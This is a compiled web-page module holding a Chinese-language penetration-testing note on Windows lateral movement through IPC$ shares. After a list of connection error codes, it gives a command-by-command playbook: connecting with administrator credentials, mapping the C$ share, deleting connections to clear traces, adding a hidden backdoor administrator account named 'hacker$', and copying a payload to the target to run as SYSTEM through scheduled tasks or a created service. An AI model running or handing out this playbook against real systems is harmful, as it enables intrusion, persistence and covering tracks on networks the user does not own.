import{_ as n,W as s,X as a,a1 as e}from"./framework-b6a07282.js";const i={},t=e(`<h2 id="ipc横向移动" tabindex="-1"><a class="header-anchor" href="#ipc横向移动" aria-hidden="true">#</a> IPC横向移动</h2><h3 id="ipc-介绍" tabindex="-1"><a class="header-anchor" href="#ipc-介绍" aria-hidden="true">#</a> IPC$介绍</h3><ul><li>IPC(internet ProcessConnection)共享“命名管道”的资源，是为了实现进程通信而开放的命名管道。IPC通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。</li><li>通过IPC$，可以与目标机器建立连接，利用这个连接可以访问目标机器中的文件，进行上传、下载等操作，还可以通过在目标机器上运行其他命令，获得目标机器的目录结构、用户列表等信息。</li></ul><h3 id="ipc-连接失败原因" tabindex="-1"><a class="header-anchor" href="#ipc-连接失败原因" aria-hidden="true">#</a> IPC$连接失败原因</h3><p>前提：</p><ol><li>目标已关闭防火墙</li><li>有防火墙但开放了139、445端口</li><li>开启了IPC$默认共享服务</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#常见连接错误</span>
回显代码5：拒绝访问
回显代码51：Windwos无法找到网络路径，网络存在问题
回显代码53：找不到网络路径，IP地址错误、目标没开机、目标lanmanserver服务未启动，目标有防火墙
回显代码67：找不到网络路径，包括lanmanserver服务未启动、IPC$被删除
回显代码1219：提供的凭据与已存在的凭据集冲突。例如：已经和目标建立了IPC$，需要删除后重新进行连接
回显代码1326：未知的用户名或错误的密码
回显代码1792：试图登录，但是网络登录服务没有启动，包括目标NetLogon服务未启动（连接域控制器时会出现此情况）
回显代码2242：此用户的密码已经过期
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="利用方式" tabindex="-1"><a class="header-anchor" href="#利用方式" aria-hidden="true">#</a> 利用方式</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#背景：已获取到一个机器的shell，目标为通过IPC横向渗透另一个内网机器。</span>

<span class="token number">1</span>.建立IPC
net use <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4<span class="token punctuation">\\</span>IPC$
net use <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4<span class="token punctuation">\\</span>IPC$ <span class="token string">&quot;Aa123456&quot;</span> /user:administrator

net use z: <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4<span class="token punctuation">\\</span>c$ <span class="token comment">#本地建立映射</span>

<span class="token comment">#清理痕迹</span>
net use <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4<span class="token punctuation">\\</span>ipc$ /del   <span class="token comment">#删除ipc$</span>
net use z: /del     <span class="token comment">#删除映射</span>

<span class="token number">2</span>.查看是否建立完成IPC$
net use


<span class="token number">3</span>.执行各种命令
net <span class="token function">time</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4 <span class="token comment">#查看时间</span>
tasklist /s <span class="token number">192.168</span>.1.4 <span class="token comment">#查看进程</span>
<span class="token function">dir</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4<span class="token punctuation">\\</span>c$ <span class="token comment">#查看C盘</span>

建立IPC连接最好用administrators账号，否则即使建立上去了也因为权限过低而难有作为。

如果在当前用户为普通用户，则需提权到system权限，然后再添加用户到administrator组，然后再绕过uac
net user hacker$ Aa123456 /add 
net localgroup administrators hacker$ /add



<span class="token comment">#配合计划任务攻击夺取另一台内网机器的shell</span>
copy C:<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>fish1<span class="token punctuation">\\</span>Desktop<span class="token punctuation">\\</span>artifact.exe <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4<span class="token punctuation">\\</span>C$ <span class="token comment">#拷贝文件到目标主机C盘下</span>
schtasks /create /u administrator /p Aa123456 /s <span class="token number">192.168</span>.1.4 /tn shellname /sc onstart /tr c:<span class="token punctuation">\\</span>artifact.exe /ru system /f <span class="token comment">#创建计划任务</span>
schtasks /run /u administrator /p Aa123456 /s <span class="token number">192.168</span>.1.4 /i /tn <span class="token string">&quot;shellname&quot;</span> <span class="token comment">#运行计划任务</span>

schtasks /query /s <span class="token number">192.168</span>.1.4 /u administrator /p Aa123456 /TN c <span class="token comment">#查看计划任务</span>


<span class="token comment">#配合服务夺取另一台内网机器的shell</span>
sc <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4 create servername <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">&quot;cmd.exe /c c:<span class="token entity" title="\\a">\\a</span>rtifact.exe&quot;</span> <span class="token comment">#创建服务</span>
sc <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4 start servername <span class="token comment">#启动服务</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,9),c=[t];function l(p,o){return s(),a("div",null,c)}const d=n(i,[["render",l],["__file","IPC横向移动.html.vue"]]);export{d as default};
